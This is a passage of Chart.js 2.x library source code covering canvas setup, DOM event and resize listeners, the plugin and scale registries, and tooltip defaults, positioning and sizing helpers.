   * @returns {number} Size in pixels or undefined if unknown.
   */
  function readUsedSize(element, property) {
    var value = helpers$1.getStyle(element, property);
    var matches = value && value.match(/^(\d+)(\.\d+)?px$/);
    return matches ? Number(matches[1]) : undefined;
  }

  /**
   * Initializes the canvas style and render size without modifying the canvas display size,
   * since responsiveness is handled by the controller.resize() method. The config is used
   * to determine the aspect ratio to apply in case no explicit height has been specified.
   */
  function initCanvas(canvas, config) {
    var style = canvas.style;

    // NOTE(SB) canvas.getAttribute('width') !== canvas.width: in the first case it
    // returns null or '' if no explicit value has been set to the canvas attribute.
    var renderHeight = canvas.getAttribute("height");
    var renderWidth = canvas.getAttribute("width");

    // Chart.js modifies some canvas values that we want to restore on destroy
    canvas[EXPANDO_KEY] = {
      initial: {
        height: renderHeight,
        width: renderWidth,
        style: {
          display: style.display,
          height: style.height,
          width: style.width,
        },
      },
    };

    // Force canvas to display as block to avoid extra space caused by inline
    // elements, which would interfere with the responsive resize process.
    // https://github.com/chartjs/Chart.js/issues/2538
    style.display = style.display || "block";

    if (renderWidth === null || renderWidth === "") {
      var displayWidth = readUsedSize(canvas, "width");
      if (displayWidth !== undefined) {
        canvas.width = displayWidth;
      }
    }

    if (renderHeight === null || renderHeight === "") {
      if (canvas.style.height === "") {
        // If no explicit render height and style height, let's apply the aspect ratio,
        // which one can be specified by the user but also by charts as default option
        // (i.e. options.aspectRatio). If not specified, use canvas aspect ratio of 2.
        canvas.height = canvas.width / (config.options.aspectRatio || 2);
      } else {
        var displayHeight = readUsedSize(canvas, "height");
        if (displayWidth !== undefined) {
          canvas.height = displayHeight;
        }
      }
    }

    return canvas;
  }

  /**
   * Detects support for options object argument in addEventListener.
   * https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/addEventListener#Safely_detecting_option_support
   * @private
   */
  var supportsEventListenerOptions = (function () {
    var supports = false;
    try {
      var options = Object.defineProperty({}, "passive", {
        // eslint-disable-next-line getter-return
        get: function () {
          supports = true;
        },
      });
      window.addEventListener("e", null, options);
    } catch (e) {
      // continue regardless of error
    }
    return supports;
  })();

  // Default passive to true as expected by Chrome for 'touchstart' and 'touchend' events.
  // https://github.com/chartjs/Chart.js/issues/4287
  var eventListenerOptions = supportsEventListenerOptions
    ? { passive: true }
    : false;

  function addListener(node, type, listener) {
    node.addEventListener(type, listener, eventListenerOptions);
  }

  function removeListener(node, type, listener) {
    node.removeEventListener(type, listener, eventListenerOptions);
  }

  function createEvent(type, chart, x, y, nativeEvent) {
    return {
      type: type,
      chart: chart,
      native: nativeEvent || null,
      x: x !== undefined ? x : null,
      y: y !== undefined ? y : null,
    };
  }

  function fromNativeEvent(event, chart) {
    var type = EVENT_TYPES[event.type] || event.type;
    var pos = helpers$1.getRelativePosition(event, chart);
    return createEvent(type, chart, pos.x, pos.y, event);
  }

  function throttled(fn, thisArg) {
    var ticking = false;
    var args = [];

    return function () {
      args = Array.prototype.slice.call(arguments);
      thisArg = thisArg || this;

      if (!ticking) {
        ticking = true;
        helpers$1.requestAnimFrame.call(window, function () {
          ticking = false;
          fn.apply(thisArg, args);
        });
      }
    };
  }

  function createDiv(cls) {
    var el = document.createElement("div");
    el.className = cls || "";
    return el;
  }

  // Implementation based on https://github.com/marcj/css-element-queries
  function createResizer(handler) {
    var maxSize = 1000000;

    // NOTE(SB) Don't use innerHTML because it could be considered unsafe.
    // https://github.com/chartjs/Chart.js/issues/5902
    var resizer = createDiv(CSS_SIZE_MONITOR);
    var expand = createDiv(CSS_SIZE_MONITOR + "-expand");
    var shrink = createDiv(CSS_SIZE_MONITOR + "-shrink");

    expand.appendChild(createDiv());
    shrink.appendChild(createDiv());

    resizer.appendChild(expand);
    resizer.appendChild(shrink);
    resizer._reset = function () {
      expand.scrollLeft = maxSize;
      expand.scrollTop = maxSize;
      shrink.scrollLeft = maxSize;
      shrink.scrollTop = maxSize;
    };

    var onScroll = function () {
      resizer._reset();
      handler();
    };

    addListener(expand, "scroll", onScroll.bind(expand, "expand"));
    addListener(shrink, "scroll", onScroll.bind(shrink, "shrink"));

    return resizer;
  }

  // https://davidwalsh.name/detect-node-insertion
  function watchForRender(node, handler) {
    var expando = node[EXPANDO_KEY] || (node[EXPANDO_KEY] = {});
    var proxy = (expando.renderProxy = function (e) {
      if (e.animationName === CSS_RENDER_ANIMATION) {
        handler();
      }
    });

    helpers$1.each(ANIMATION_START_EVENTS, function (type) {
      addListener(node, type, proxy);
    });

    // #4737: Chrome might skip the CSS animation when the CSS_RENDER_MONITOR class
    // is removed then added back immediately (same animation frame?). Accessing the
    // `offsetParent` property will force a reflow and re-evaluate the CSS animation.
    // https://gist.github.com/paulirish/5d52fb081b3570c81e3a#box-metrics
    // https://github.com/chartjs/Chart.js/issues/4737
    expando.reflow = !!node.offsetParent;

    node.classList.add(CSS_RENDER_MONITOR);
  }

  function unwatchForRender(node) {
    var expando = node[EXPANDO_KEY] || {};
    var proxy = expando.renderProxy;

    if (proxy) {
      helpers$1.each(ANIMATION_START_EVENTS, function (type) {
        removeListener(node, type, proxy);
      });

      delete expando.renderProxy;
    }

    node.classList.remove(CSS_RENDER_MONITOR);
  }

  function addResizeListener(node, listener, chart) {
    var expando = node[EXPANDO_KEY] || (node[EXPANDO_KEY] = {});

    // Let's keep track of this added resizer and thus avoid DOM query when removing it.
    var resizer = (expando.resizer = createResizer(
      throttled(function () {
        if (expando.resizer) {
          var container = chart.options.maintainAspectRatio && node.parentNode;
          var w = container ? container.clientWidth : 0;
          listener(createEvent("resize", chart));
          if (container && container.clientWidth < w && chart.canvas) {
            // If the container size shrank during chart resize, let's assume
            // scrollbar appeared. So we resize again with the scrollbar visible -
            // effectively making chart smaller and the scrollbar hidden again.
            // Because we are inside `throttled`, and currently `ticking`, scroll
            // events are ignored during this whole 2 resize process.
            // If we assumed wrong and something else happened, we are resizing
            // twice in a frame (potential performance issue)
            listener(createEvent("resize", chart));
          }
        }
      })
    ));

    // The resizer needs to be attached to the node parent, so we first need to be
    // sure that `node` is attached to the DOM before injecting the resizer element.
    watchForRender(node, function () {
      if (expando.resizer) {
        var container = node.parentNode;
        if (container && container !== resizer.parentNode) {
          container.insertBefore(resizer, container.firstChild);
        }

        // The container size might have changed, let's reset the resizer state.
        resizer._reset();
      }
    });
  }

  function removeResizeListener(node) {
    var expando = node[EXPANDO_KEY] || {};
    var resizer = expando.resizer;

    delete expando.resizer;
    unwatchForRender(node);

    if (resizer && resizer.parentNode) {
      resizer.parentNode.removeChild(resizer);
    }
  }

  /**
   * Injects CSS styles inline if the styles are not already present.
   * @param {HTMLDocument|ShadowRoot} rootNode - the node to contain the <style>.
   * @param {string} css - the CSS to be injected.
   */
  function injectCSS(rootNode, css) {
    // https://stackoverflow.com/q/3922139
    var expando = rootNode[EXPANDO_KEY] || (rootNode[EXPANDO_KEY] = {});
    if (!expando.containsStyles) {
      expando.containsStyles = true;
      css = "/* Chart.js */\n" + css;
      var style = document.createElement("style");
      style.setAttribute("type", "text/css");
      style.appendChild(document.createTextNode(css));
      rootNode.appendChild(style);
    }
  }

  var platform_dom$2 = {
    /**
     * When `true`, prevents the automatic injection of the stylesheet required to
     * correctly detect when the chart is added to the DOM and then resized. This
     * switch has been added to allow external stylesheet (`dist/Chart(.min)?.js`)
     * to be manually imported to make this library compatible with any CSP.
     * See https://github.com/chartjs/Chart.js/issues/5208
     */
    disableCSSInjection: false,

    /**
     * This property holds whether this platform is enabled for the current environment.
     * Currently used by platform.js to select the proper implementation.
     * @private
     */
    _enabled: typeof window !== "undefined" && typeof document !== "undefined",

    /**
     * Initializes resources that depend on platform options.
     * @param {HTMLCanvasElement} canvas - The Canvas element.
     * @private
     */
    _ensureLoaded: function (canvas) {
      if (!this.disableCSSInjection) {
        // If the canvas is in a shadow DOM, then the styles must also be inserted
        // into the same shadow DOM.
        // https://github.com/chartjs/Chart.js/issues/5763
        var root = canvas.getRootNode ? canvas.getRootNode() : document;
        var targetNode = root.host ? root : document.head;
        injectCSS(targetNode, stylesheet);
      }
    },

    acquireContext: function (item, config) {
      if (typeof item === "string") {
        item = document.getElementById(item);
      } else if (item.length) {
        // Support for array based queries (such as jQuery)
        item = item[0];
      }

      if (item && item.canvas) {
        // Support for any object associated to a canvas (including a context2d)
        item = item.canvas;
      }

      // To prevent canvas fingerprinting, some add-ons undefine the getContext
      // method, for example: https://github.com/kkapsner/CanvasBlocker
      // https://github.com/chartjs/Chart.js/issues/2807
      var context = item && item.getContext && item.getContext("2d");

      // `instanceof HTMLCanvasElement/CanvasRenderingContext2D` fails when the item is
      // inside an iframe or when running in a protected environment. We could guess the
      // types from their toString() value but let's keep things flexible and assume it's
      // a sufficient condition if the item has a context2D which has item as `canvas`.
      // https://github.com/chartjs/Chart.js/issues/3887
      // https://github.com/chartjs/Chart.js/issues/4102
      // https://github.com/chartjs/Chart.js/issues/4152
      if (context && context.canvas === item) {
        // Load platform resources on first chart creation, to make it possible to
        // import the library before setting platform options.
        this._ensureLoaded(item);
        initCanvas(item, config);
        return context;
      }

      return null;
    },

    releaseContext: function (context) {
      var canvas = context.canvas;
      if (!canvas[EXPANDO_KEY]) {
        return;
      }

      var initial = canvas[EXPANDO_KEY].initial;
      ["height", "width"].forEach(function (prop) {
        var value = initial[prop];
        if (helpers$1.isNullOrUndef(value)) {
          canvas.removeAttribute(prop);
        } else {
          canvas.setAttribute(prop, value);
        }
      });

      helpers$1.each(initial.style || {}, function (value, key) {
        canvas.style[key] = value;
      });

      // The canvas render size might have been changed (and thus the state stack discarded),
      // we can't use save() and restore() to restore the initial state. So make sure that at
      // least the canvas context is reset to the default state by setting the canvas width.
      // https://www.w3.org/TR/2011/WD-html5-20110525/the-canvas-element.html
      // eslint-disable-next-line no-self-assign
      canvas.width = canvas.width;

      delete canvas[EXPANDO_KEY];
    },

    addEventListener: function (chart, type, listener) {
      var canvas = chart.canvas;
      if (type === "resize") {
        // Note: the resize event is not supported on all browsers.
        addResizeListener(canvas, listener, chart);
        return;
      }

      var expando = listener[EXPANDO_KEY] || (listener[EXPANDO_KEY] = {});
      var proxies = expando.proxies || (expando.proxies = {});
      var proxy = (proxies[chart.id + "_" + type] = function (event) {
        listener(fromNativeEvent(event, chart));
      });

      addListener(canvas, type, proxy);
    },

    removeEventListener: function (chart, type, listener) {
      var canvas = chart.canvas;
      if (type === "resize") {
        // Note: the resize event is not supported on all browsers.
        removeResizeListener(canvas);
        return;
      }

      var expando = listener[EXPANDO_KEY] || {};
      var proxies = expando.proxies || {};
      var proxy = proxies[chart.id + "_" + type];
      if (!proxy) {
        return;
      }

      removeListener(canvas, type, proxy);
    },
  };

  // DEPRECATIONS

  /**
   * Provided for backward compatibility, use EventTarget.addEventListener instead.
   * EventTarget.addEventListener compatibility: Chrome, Opera 7, Safari, FF1.5+, IE9+
   * @see https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/addEventListener
   * @function Chart.helpers.addEvent
   * @deprecated since version 2.7.0
   * @todo remove at version 3
   * @private
   */
  helpers$1.addEvent = addListener;

  /**
   * Provided for backward compatibility, use EventTarget.removeEventListener instead.
   * EventTarget.removeEventListener compatibility: Chrome, Opera 7, Safari, FF1.5+, IE9+
   * @see https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/removeEventListener
   * @function Chart.helpers.removeEvent
   * @deprecated since version 2.7.0
   * @todo remove at version 3
   * @private
   */
  helpers$1.removeEvent = removeListener;

  // @TODO Make possible to select another platform at build time.
  var implementation = platform_dom$2._enabled
    ? platform_dom$2
    : platform_basic;

  /**
   * @namespace Chart.platform
   * @see https://chartjs.gitbooks.io/proposals/content/Platform.html
   * @since 2.4.0
   */
  var platform = helpers$1.extend(
    {
      /**
       * @since 2.7.0
       */
      initialize: function () {},

      /**
       * Called at chart construction time, returns a context2d instance implementing
       * the [W3C Canvas 2D Context API standard]{@link https://www.w3.org/TR/2dcontext/}.
       * @param {*} item - The native item from which to acquire context (platform specific)
       * @param {object} options - The chart options
       * @returns {CanvasRenderingContext2D} context2d instance
       */
      acquireContext: function () {},

      /**
       * Called at chart destruction time, releases any resources associated to the context
       * previously returned by the acquireContext() method.
       * @param {CanvasRenderingContext2D} context - The context2d instance
       * @returns {boolean} true if the method succeeded, else false
       */
      releaseContext: function () {},

      /**
       * Registers the specified listener on the given chart.
       * @param {Chart} chart - Chart from which to listen for event
       * @param {string} type - The ({@link IEvent}) type to listen for
       * @param {function} listener - Receives a notification (an object that implements
       * the {@link IEvent} interface) when an event of the specified type occurs.
       */
      addEventListener: function () {},

      /**
       * Removes the specified listener previously registered with addEventListener.
       * @param {Chart} chart - Chart from which to remove the listener
       * @param {string} type - The ({@link IEvent}) type to remove
       * @param {function} listener - The listener function to remove from the event target.
       */
      removeEventListener: function () {},
    },
    implementation
  );

  core_defaults._set("global", {
    plugins: {},
  });

  /**
   * The plugin service singleton
   * @namespace Chart.plugins
   * @since 2.1.0
   */
  var core_plugins = {
    /**
     * Globally registered plugins.
     * @private
     */
    _plugins: [],

    /**
     * This identifier is used to invalidate the descriptors cache attached to each chart
     * when a global plugin is registered or unregistered. In this case, the cache ID is
     * incremented and descriptors are regenerated during following API calls.
     * @private
     */
    _cacheId: 0,

    /**
     * Registers the given plugin(s) if not already registered.
     * @param {IPlugin[]|IPlugin} plugins plugin instance(s).
     */
    register: function (plugins) {
      var p = this._plugins;
      [].concat(plugins).forEach(function (plugin) {
        if (p.indexOf(plugin) === -1) {
          p.push(plugin);
        }
      });

      this._cacheId++;
    },

    /**
     * Unregisters the given plugin(s) only if registered.
     * @param {IPlugin[]|IPlugin} plugins plugin instance(s).
     */
    unregister: function (plugins) {
      var p = this._plugins;
      [].concat(plugins).forEach(function (plugin) {
        var idx = p.indexOf(plugin);
        if (idx !== -1) {
          p.splice(idx, 1);
        }
      });

      this._cacheId++;
    },

    /**
     * Remove all registered plugins.
     * @since 2.1.5
     */
    clear: function () {
      this._plugins = [];
      this._cacheId++;
    },

    /**
     * Returns the number of registered plugins?
     * @returns {number}
     * @since 2.1.5
     */
    count: function () {
      return this._plugins.length;
    },

    /**
     * Returns all registered plugin instances.
     * @returns {IPlugin[]} array of plugin objects.
     * @since 2.1.5
     */
    getAll: function () {
      return this._plugins;
    },

    /**
     * Calls enabled plugins for `chart` on the specified hook and with the given args.
     * This method immediately returns as soon as a plugin explicitly returns false. The
     * returned value can be used, for instance, to interrupt the current action.
     * @param {Chart} chart - The chart instance for which plugins should be called.
     * @param {string} hook - The name of the plugin method to call (e.g. 'beforeUpdate').
     * @param {Array} [args] - Extra arguments to apply to the hook call.
     * @returns {boolean} false if any of the plugins return false, else returns true.
     */
    notify: function (chart, hook, args) {
      var descriptors = this.descriptors(chart);
      var ilen = descriptors.length;
      var i, descriptor, plugin, params, method;

      for (i = 0; i < ilen; ++i) {
        descriptor = descriptors[i];
        plugin = descriptor.plugin;
        method = plugin[hook];
        if (typeof method === "function") {
          params = [chart].concat(args || []);
          params.push(descriptor.options);
          if (method.apply(plugin, params) === false) {
            return false;
          }
        }
      }

      return true;
    },

    /**
     * Returns descriptors of enabled plugins for the given chart.
     * @returns {object[]} [{ plugin, options }]
     * @private
     */
    descriptors: function (chart) {
      var cache = chart.$plugins || (chart.$plugins = {});
      if (cache.id === this._cacheId) {
        return cache.descriptors;
      }

      var plugins = [];
      var descriptors = [];
      var config = (chart && chart.config) || {};
      var options = (config.options && config.options.plugins) || {};

      this._plugins.concat(config.plugins || []).forEach(function (plugin) {
        var idx = plugins.indexOf(plugin);
        if (idx !== -1) {
          return;
        }

        var id = plugin.id;
        var opts = options[id];
        if (opts === false) {
          return;
        }

        if (opts === true) {
          opts = helpers$1.clone(core_defaults.global.plugins[id]);
        }

        plugins.push(plugin);
        descriptors.push({
          plugin: plugin,
          options: opts || {},
        });
      });

      cache.descriptors = descriptors;
      cache.id = this._cacheId;
      return descriptors;
    },

    /**
     * Invalidates cache for the given chart: descriptors hold a reference on plugin option,
     * but in some cases, this reference can be changed by the user when updating options.
     * https://github.com/chartjs/Chart.js/issues/5111#issuecomment-355934167
     * @private
     */
    _invalidate: function (chart) {
      delete chart.$plugins;
    },
  };

  var core_scaleService = {
    // Scale registration object. Extensions can register new scale types (such as log or DB scales) and then
    // use the new chart options to grab the correct scale
    constructors: {},
    // Use a registration function so that we can move to an ES6 map when we no longer need to support
    // old browsers

    // Scale config defaults
    defaults: {},
    registerScaleType: function (type, scaleConstructor, scaleDefaults) {
      this.constructors[type] = scaleConstructor;
      this.defaults[type] = helpers$1.clone(scaleDefaults);
    },
    getScaleConstructor: function (type) {
      return this.constructors.hasOwnProperty(type)
        ? this.constructors[type]
        : undefined;
    },
    getScaleDefaults: function (type) {
      // Return the scale defaults merged with the global settings so that we always use the latest ones
      return this.defaults.hasOwnProperty(type)
        ? helpers$1.merge(Object.create(null), [
            core_defaults.scale,
            this.defaults[type],
          ])
        : {};
    },
    updateScaleDefaults: function (type, additions) {
      var me = this;
      if (me.defaults.hasOwnProperty(type)) {
        me.defaults[type] = helpers$1.extend(me.defaults[type], additions);
      }
    },
    addScalesToLayout: function (chart) {
      // Adds each scale to the chart.boxes array to be sized accordingly
      helpers$1.each(chart.scales, function (scale) {
        // Set ILayoutItem parameters for backwards compatibility
        scale.fullWidth = scale.options.fullWidth;
        scale.position = scale.options.position;
        scale.weight = scale.options.weight;
        core_layouts.addBox(chart, scale);
      });
    },
  };

  var valueOrDefault$8 = helpers$1.valueOrDefault;
  var getRtlHelper = helpers$1.rtl.getRtlAdapter;

  core_defaults._set("global", {
    tooltips: {
      enabled: true,
      custom: null,
      mode: "nearest",
      position: "average",
      intersect: true,
      backgroundColor: "rgba(0,0,0,0.8)",
      titleFontStyle: "bold",
      titleSpacing: 2,
      titleMarginBottom: 6,
      titleFontColor: "#fff",
      titleAlign: "left",
      bodySpacing: 2,
      bodyFontColor: "#fff",
      bodyAlign: "left",
      footerFontStyle: "bold",
      footerSpacing: 2,
      footerMarginTop: 6,
      footerFontColor: "#fff",
      footerAlign: "left",
      yPadding: 6,
      xPadding: 6,
      caretPadding: 2,
      caretSize: 5,
      cornerRadius: 6,
      multiKeyBackground: "#fff",
      displayColors: true,
      borderColor: "rgba(0,0,0,0)",
      borderWidth: 0,
      callbacks: {
        // Args are: (tooltipItems, data)
        beforeTitle: helpers$1.noop,
        title: function (tooltipItems, data) {
          var title = "";
          var labels = data.labels;
          var labelCount = labels ? labels.length : 0;

          if (tooltipItems.length > 0) {
            var item = tooltipItems[0];
            if (item.label) {
              title = item.label;
            } else if (item.xLabel) {
              title = item.xLabel;
            } else if (labelCount > 0 && item.index < labelCount) {
              title = labels[item.index];
            }
          }

          return title;
        },
        afterTitle: helpers$1.noop,

        // Args are: (tooltipItems, data)
        beforeBody: helpers$1.noop,

        // Args are: (tooltipItem, data)
        beforeLabel: helpers$1.noop,
        label: function (tooltipItem, data) {
          var label = data.datasets[tooltipItem.datasetIndex].label || "";

          if (label) {
            label += ": ";
          }
          if (!helpers$1.isNullOrUndef(tooltipItem.value)) {
            label += tooltipItem.value;
          } else {
            label += tooltipItem.yLabel;
          }
          return label;
        },
        labelColor: function (tooltipItem, chart) {
          var meta = chart.getDatasetMeta(tooltipItem.datasetIndex);
          var activeElement = meta.data[tooltipItem.index];
          var view = activeElement._view;
          return {
            borderColor: view.borderColor,
            backgroundColor: view.backgroundColor,
          };
        },
        labelTextColor: function () {
          return this._options.bodyFontColor;
        },
        afterLabel: helpers$1.noop,

        // Args are: (tooltipItems, data)
        afterBody: helpers$1.noop,

        // Args are: (tooltipItems, data)
        beforeFooter: helpers$1.noop,
        footer: helpers$1.noop,
        afterFooter: helpers$1.noop,
      },
    },
  });

  var positioners = {
    /**
     * Average mode places the tooltip at the average position of the elements shown
     * @function Chart.Tooltip.positioners.average
     * @param elements {ChartElement[]} the elements being displayed in the tooltip
     * @returns {object} tooltip position
     */
    average: function (elements) {
      if (!elements.length) {
        return false;
      }

      var i, len;
      var x = 0;
      var y = 0;
      var count = 0;

      for (i = 0, len = elements.length; i < len; ++i) {
        var el = elements[i];
        if (el && el.hasValue()) {
          var pos = el.tooltipPosition();
          x += pos.x;
          y += pos.y;
          ++count;
        }
      }

      return {
        x: x / count,
        y: y / count,
      };
    },

    /**
     * Gets the tooltip position nearest of the item nearest to the event position
     * @function Chart.Tooltip.positioners.nearest
     * @param elements {Chart.Element[]} the tooltip elements
     * @param eventPosition {object} the position of the event in canvas coordinates
     * @returns {object} the tooltip position
     */
    nearest: function (elements, eventPosition) {
      var x = eventPosition.x;
      var y = eventPosition.y;
      var minDistance = Number.POSITIVE_INFINITY;
      var i, len, nearestElement;

      for (i = 0, len = elements.length; i < len; ++i) {
        var el = elements[i];
        if (el && el.hasValue()) {
          var center = el.getCenterPoint();
          var d = helpers$1.distanceBetweenPoints(eventPosition, center);

          if (d < minDistance) {
            minDistance = d;
            nearestElement = el;
          }
        }
      }

      if (nearestElement) {
        var tp = nearestElement.tooltipPosition();
        x = tp.x;
        y = tp.y;
      }

      return {
        x: x,
        y: y,
      };
    },
  };

  // Helper to push or concat based on if the 2nd parameter is an array or not
  function pushOrConcat(base, toPush) {
    if (toPush) {
      if (helpers$1.isArray(toPush)) {
        // base = base.concat(toPush);
        Array.prototype.push.apply(base, toPush);
      } else {
        base.push(toPush);
      }
    }

    return base;
  }

  /**
   * Returns array of strings split by newline
   * @param {string} value - The value to split by newline.
   * @returns {string[]} value if newline present - Returned from String split() method
   * @function
   */
  function splitNewlines(str) {
    if (
      (typeof str === "string" || str instanceof String) &&
      str.indexOf("\n") > -1
    ) {
      return str.split("\n");
    }
    return str;
  }

  /**
   * Private helper to create a tooltip item model
   * @param element - the chart element (point, arc, bar) to create the tooltip item for
   * @return new tooltip item
   */
  function createTooltipItem(element) {
    var xScale = element._xScale;
    var yScale = element._yScale || element._scale; // handle radar || polarArea charts
    var index = element._index;
    var datasetIndex = element._datasetIndex;
    var controller = element._chart.getDatasetMeta(datasetIndex).controller;
    var indexScale = controller._getIndexScale();
    var valueScale = controller._getValueScale();

    return {
      xLabel: xScale ? xScale.getLabelForIndex(index, datasetIndex) : "",
      yLabel: yScale ? yScale.getLabelForIndex(index, datasetIndex) : "",
      label: indexScale
        ? "" + indexScale.getLabelForIndex(index, datasetIndex)
        : "",
      value: valueScale
        ? "" + valueScale.getLabelForIndex(index, datasetIndex)
        : "",
      index: index,
      datasetIndex: datasetIndex,
      x: element._model.x,
      y: element._model.y,
    };
  }

  /**
   * Helper to get the reset model for the tooltip
   * @param tooltipOpts {object} the tooltip options
   */
  function getBaseModel(tooltipOpts) {
    var globalDefaults = core_defaults.global;

    return {
      // Positioning
      xPadding: tooltipOpts.xPadding,
      yPadding: tooltipOpts.yPadding,
      xAlign: tooltipOpts.xAlign,
      yAlign: tooltipOpts.yAlign,

      // Drawing direction and text direction
      rtl: tooltipOpts.rtl,
      textDirection: tooltipOpts.textDirection,

      // Body
      bodyFontColor: tooltipOpts.bodyFontColor,
      _bodyFontFamily: valueOrDefault$8(
        tooltipOpts.bodyFontFamily,
        globalDefaults.defaultFontFamily
      ),
      _bodyFontStyle: valueOrDefault$8(
        tooltipOpts.bodyFontStyle,
        globalDefaults.defaultFontStyle
      ),
      _bodyAlign: tooltipOpts.bodyAlign,
      bodyFontSize: valueOrDefault$8(
        tooltipOpts.bodyFontSize,
        globalDefaults.defaultFontSize
      ),
      bodySpacing: tooltipOpts.bodySpacing,

      // Title
      titleFontColor: tooltipOpts.titleFontColor,
      _titleFontFamily: valueOrDefault$8(
        tooltipOpts.titleFontFamily,
        globalDefaults.defaultFontFamily
      ),
      _titleFontStyle: valueOrDefault$8(
        tooltipOpts.titleFontStyle,
        globalDefaults.defaultFontStyle
      ),
      titleFontSize: valueOrDefault$8(
        tooltipOpts.titleFontSize,
        globalDefaults.defaultFontSize
      ),
      _titleAlign: tooltipOpts.titleAlign,
      titleSpacing: tooltipOpts.titleSpacing,
      titleMarginBottom: tooltipOpts.titleMarginBottom,

      // Footer
      footerFontColor: tooltipOpts.footerFontColor,
      _footerFontFamily: valueOrDefault$8(
        tooltipOpts.footerFontFamily,
        globalDefaults.defaultFontFamily
      ),
      _footerFontStyle: valueOrDefault$8(
        tooltipOpts.footerFontStyle,
        globalDefaults.defaultFontStyle
      ),
      footerFontSize: valueOrDefault$8(
        tooltipOpts.footerFontSize,
        globalDefaults.defaultFontSize
      ),
      _footerAlign: tooltipOpts.footerAlign,
      footerSpacing: tooltipOpts.footerSpacing,
      footerMarginTop: tooltipOpts.footerMarginTop,

      // Appearance
      caretSize: tooltipOpts.caretSize,
      cornerRadius: tooltipOpts.cornerRadius,
      backgroundColor: tooltipOpts.backgroundColor,
      opacity: 0,
      legendColorBackground: tooltipOpts.multiKeyBackground,
      displayColors: tooltipOpts.displayColors,
      borderColor: tooltipOpts.borderColor,
      borderWidth: tooltipOpts.borderWidth,
    };
  }

  /**
   * Get the size of the tooltip
   */
  function getTooltipSize(tooltip, model) {
    var ctx = tooltip._chart.ctx;

    var height = model.yPadding * 2; // Tooltip Padding
    var width = 0;

    // Count of all lines in the body
    var body = model.body;
    var combinedBodyLength = body.reduce(function (count, bodyItem) {
      return (
        count +
        bodyItem.before.length +
        bodyItem.lines.length +
        bodyItem.after.length
      );
    }, 0);
    combinedBodyLength += model.beforeBody.length + model.afterBody.length;

    var titleLineCount = model.title.length;
    var footerLineCount = model.footer.length;
    var titleFontSize = model.titleFontSize;
    var bodyFontSize = model.bodyFontSize;
    var footerFontSize = model.footerFontSize;

    height += titleLineCount * titleFontSize; // Title Lines
    height += titleLineCount ? (titleLineCount - 1) * model.titleSpacing : 0; // Title Line Spacing
    height += titleLineCount ? model.titleMarginBottom : 0; // Title's bottom Margin
    height += combinedBodyLength * bodyFontSize; // Body Lines
    height += combinedBodyLength
      ? (combinedBodyLength - 1) * model.bodySpacing
      : 0; // Body Line Spacing
    height += footerLineCount ? model.footerMarginTop : 0; // Footer Margin
    height += footerLineCount * footerFontSize; // Footer Lines
    height += footerLineCount ? (footerLineCount - 1) * model.footerSpacing : 0; // Footer Line Spacing

    // Title width
    var widthPadding = 0;
    var maxLineWidth = function (line) {
      width = Math.max(width, ctx.measureText(line).width + widthPadding);
    };

    ctx.font = helpers$1.fontString(
      titleFontSize,
      model._titleFontStyle,
      model._titleFontFamily
    );
    helpers$1.each(model.title, maxLineWidth);

    // Body width
    ctx.font = helpers$1.fontString(
      bodyFontSize,
      model._bodyFontStyle,
      model._bodyFontFamily
    );
    helpers$1.each(model.beforeBody.concat(model.afterBody), maxLineWidth);

    // Body lines may include some extra width due to the color box
    widthPadding = model.displayColors ? bodyFontSize + 2 : 0;
    helpers$1.each(body, function (bodyItem) {
      helpers$1.each(bodyItem.before, maxLineWidth);
      helpers$1.each(bodyItem.lines, maxLineWidth);
      helpers$1.each(bodyItem.after, maxLineWidth);
    });

    // Reset back to 0
    widthPadding = 0;

    // Footer width
    ctx.font = helpers$1.fontString(
      footerFontSize,
      model._footerFontStyle,
      model._footerFontFamily
    );
    helpers$1.each(model.footer, maxLineWidth);

    // Add padding
    width += 2 * model.xPadding;

    return {
      width: width,
      height: height,
    };
  }

  /**
   * Helper to get the alignment of a tooltip given the size
   */
  function determineAlignment(tooltip, size) {
    var model = tooltip._model;
    var chart = tooltip._chart;
    var chartArea = tooltip._chart.chartArea;
    var xAlign = "center";
    var yAlign = "center";

    if (model.y < size.height) {
      yAlign = "top";
    } else if (model.y > chart.height - size.height) {
      yAlign = "bottom";
    }

    var lf, rf; // functions to determine left, right alignment
    var olf, orf; // functions to determine if left/right alignment causes tooltip to go outside chart
    var yf; // function to get the y alignment if the tooltip goes outside of the left or right edges
    var midX = (chartArea.left + chartArea.right) / 2;
    var midY = (chartArea.top + chartArea.bottom) / 2;

    if (yAlign === "center") {
      lf = function (x) {
        return x <= midX;
      };
      rf = function (x) {
        return x > midX;
      };
    } else {
      lf = function (x) {
        return x <= size.width / 2;
      };
      rf = function (x) {
        return x >= chart.width - size.width / 2;
      };
    }

    olf = function (x) {
      return (
        x + size.width + model.caretSize + model.caretPadding > chart.width
      );
    };
    orf = function (x) {
      return x - size.width - model.caretSize - model.caretPadding < 0;
    };
    yf = function (y) {
      return y <= midY ? "top" : "bottom";
    };

    if (lf(model.x)) {
      xAlign = "left";

      // Is tooltip too wide and goes over the right side of the chart.?
      if (olf(model.x)) {
        xAlign = "center";
        yAlign = yf(model.y);
      }
    } else if (rf(model.x)) {
      xAlign = "right";

      // Is tooltip too wide and goes outside left edge of canvas?
      if (orf(model.x)) {
        xAlign = "center";
        yAlign = yf(model.y);
      }
    }

    var opts = tooltip._options;
    return {
      xAlign: opts.xAlign ? opts.xAlign : xAlign,
      yAlign: opts.yAlign ? opts.yAlign : yAlign,
    };
  }

  /**
   * Helper to get the location a tooltip needs to be placed at given the initial position (via the vm) and the size and alignment
   */
  function getBackgroundPoint(vm, size, alignment, chart) {
    // Background Position
    var x = vm.x;
    var y = vm.y;

    var caretSize = vm.caretSize;
    var caretPadding = vm.caretPadding;
    var cornerRadius = vm.cornerRadius;
    var xAlign = alignment.xAlign;
    var yAlign = alignment.yAlign;
    var paddingAndSize = caretSize + caretPadding;
    var radiusAndPadding = cornerRadius + caretPadding;

    if (xAlign === "right") {
      x -= size.width;
    } else if (xAlign === "center") {
      x -= size.width / 2;
      if (x + size.width > chart.width) {
        x = chart.width - size.width;
      }
      if (x < 0) {
        x = 0;
      }
    }

    if (yAlign === "top") {
      y += paddingAndSize;
    } else if (yAlign === "bottom") {
      y -= size.height + paddingAndSize;
    } else {
      y -= size.height / 2;
    }

    if (yAlign === "center") {
      if (xAlign === "left") {
        x += paddingAndSize;
      } else if (xAlign === "right") {
        x -= paddingAndSize;
      }
    } else if (xAlign === "left") {
